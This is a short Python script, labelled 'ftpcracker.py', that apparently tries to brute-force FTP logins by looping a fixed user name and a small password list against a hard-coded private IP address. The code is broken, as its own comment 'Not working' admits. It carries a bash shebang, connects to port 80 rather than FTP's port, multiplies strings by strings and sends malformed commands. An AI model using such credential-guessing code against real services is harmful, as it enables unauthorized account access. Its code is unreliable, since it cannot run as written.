#!/bin/bash
#------------------------------------------
#---Made by:   ./1scriptmaker.sh
#---This is:   ftpcracker.py
#------------------------------------------

#Not working.....


import socket	#Connect to port or socket
import re	#Regular expressions
import sys	#Reading and storing files/passwords
#---------------------------------------------------

print("============================================")

def connection(ip, user, passw):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	print('Trying' + ip + ':' + user + ':' + passw)

	sock.connect(('10.0.2.15', 80))

	data = sock.recv(1024) # Data received

	sock.send('User' + user * '\r\n')

	data = sock.recv(1024)

	sock.send('Password' + passw * '\r\n')

	data = sock.recv(1024)

	sock.send('Quit' * '\r\n')
	sock.close()


	return data

user = 'User1'
password = ['pass1', 'pass2', 'pass3']

for password in password:
	print(connection('10.0.2.15', user, password))



